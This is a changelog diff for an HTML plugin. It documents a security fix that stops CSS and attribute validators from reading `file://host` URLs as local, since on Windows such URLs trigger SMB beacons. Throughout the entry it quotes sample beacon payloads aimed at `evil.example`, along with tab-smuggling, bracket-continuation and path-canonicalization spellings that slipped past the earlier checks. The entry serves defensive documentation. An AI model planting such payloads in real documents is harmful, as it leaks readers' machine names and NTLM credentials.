@@ -4,6 +4,75 @@ All notable changes to the `commentable-html` plugin are documented here. The fo
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and versions follow
 [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [1.822.0] - 2026-08-07
+
+### Fixed
+
+- The CSS egress gates now recognize an explicit `file://` AUTHORITY, the same spelling the
+  attribute predicate has called an off-machine load since it gained a `file:` arm. On Windows
+  `file://host/x` is an SMB fetch that leaks the reader's machine name and, depending on
+  configuration, an NTLM handshake, yet `url(file://evil.example/beacon.png)`, the `@import` form
+  beside it, an `image-set()` candidate, a `style=` attribute, an SVG presentation attribute and
+  the nested `iframe srcdoc` scan all read it as a LOCAL reference. So a shareable document
+  carrying one passed `--strict` as self-contained and earned the `commentable-html-validated`
+  stamp while beaconing on open. The recorded reason for leaving those gates narrower was that the
+  zero-network CSP closes the channel, and that holds in OFFLINE mode only - shareable mode
+  requires no CSP at all, so the literal gate was the single layer.
+- The fix is a SHARED arm rather than a second hand-written rule, so the two sides cannot drift
+  apart again: the `file:` authority is built once and read by the attribute predicate and by every
+  CSS reader, parameterized only by what ends a value in the caller's context (nothing for an
+  attribute, a quote / `)` / whitespace / `;{}` for a stylesheet). The separator arithmetic
+  (exactly two separators, or four-or-more), the `localhost` and Windows drive-letter exclusions,
+  the non-empty-authority rule and the two canonicalization arms therefore answer identically in a
+  stylesheet and in an attribute. The local controls stay clean, which is what the sharing buys:
+  `url(file:///C:/x.png)`, `url(file://localhost/x.png)`, `url(file://C:/x.png)` and
+  `url(file://localhost)` are all left untouched, so the widening cannot delete an author's own
+  local reference. The deck gate and the nested `srcdoc` scan inherit the verdict because they read
+  the same assembled patterns.
+- The exporter's CSS strip moved in the same change and is pinned to the validator as TEXT, not
+  merely by verdicts: the runtime's own arm builder is evaluated in a real JS engine and compared
+  character for character for every terminator set its callers use, so a widening can no longer
+  land on one side and make the gate reject a file the exporter just produced.
+- Which characters END a CSS value is part of that shared arm, and three of those memberships are
+  load-bearing rather than cosmetic; each was measured. ASCII tab does NOT end a value, because it is
+  one of the three characters the URL parser removes from anywhere: counting it fired the `localhost`
+  exclusion on `url("file://localhost<TAB>evil.example/x")`, whose host a browser reads as
+  `localhostevil.example` - the SMB beacon the gate is there to catch. A raw LF or CR DOES end one,
+  for a CSS reason rather than a URL one: unescaped, it makes a bad-string token whose declaration a
+  browser drops. And an open paren does not, because a quoted CSS string may legally contain one.
+- Bounding the arm's two canonicalization scans by that terminator set was wrong in the other
+  direction, and the second review round caught it in a real engine: a quoted string may carry a
+  terminator inside its PATH, so scanning to one truncated the scan and hid the popping segment
+  behind it. `url("file:///a(/..//evil.example/x.png")` canonicalizes onto the four-separator UNC
+  form and Chromium 151 really requested `file://evil.example/x.png` for it, while every CSS reader
+  called it local. The scans now read what a path may CONTAIN - everything but the query, the
+  fragment, and the raw newline that ends a CSS string - and are bounded by a length cap instead.
+  The cap is what keeps them linear: unbounded, these readers are quadratic, and since they run
+  unanchored over authored content while the exporter runs its mirror of them to convergence in the
+  reader's own browser, a stylesheet of repeated `url(file:a` (1.1s at 39 KB, 17.2s at 156 KB, 69.3s
+  at 312 KB) was a hung tab rather than a slow test. The residual the cap buys is bounded and
+  recorded: a canonicalization-only spelling whose path runs past the cap before its popping segment
+  is not scanned. It costs nothing on the channel this change exists for - the two authority arms,
+  which decide `file://host/x` and `file:////host/x`, are exact and uncapped.
+- What may FOLLOW a `localhost` or drive-letter host for the exclusion to fire is a property of the
+  URL PARSER, not of the caller's syntax, and it now has its own set. A character that can legally
+  CONTINUE a host does not end one: `file://localhost)evil.example/x` parses to host
+  `localhost)evil.example`, an off-machine SMB name, so reading the CSS value terminator as the end
+  of the host fired the `localhost` exclusion and blessed exactly the beacon this change exists to
+  catch. Measured in a real engine, the only host enders are `/`, `?`, `#` and a backslash, the
+  characters that make the URL fail to parse at all (space, form feed, `<`, `>`), and the true end of
+  the value; `)`, `(`, `;`, `{`, `}`, either quote and the parser-removed tab, LF and CR all continue
+  it. The residual is fail-CLOSED and narrow: a bare authority with no path whose value ends at a
+  host-legal character - `url(file://localhost)`, the local root - is over-reported, because a
+  quote-agnostic reader cannot tell it from `url("file://localhost)evil.example/x")`. Every realistic
+  local reference carries a path, where the `/` ends the host and the exclusion still fires.
+- The deck gate's DEGRADED fallback - the reading used when a broken or partial install cannot import
+  the shared CSS predicates - now recognizes `file:` too. It had been left at http/https and
+  scheme-relative, so the one path whose entire purpose is to fail closed would have blessed the very
+  beacon the shared reading catches. Like the rest of that fallback it carries no separator
+  arithmetic and no exclusions, so it over-reports a local `file:` reference as well; refusing a deck
+  is the safe direction when the reading that can tell them apart is unavailable.
+
 ## [1.821.0] - 2026-08-07
 
 ### Changed
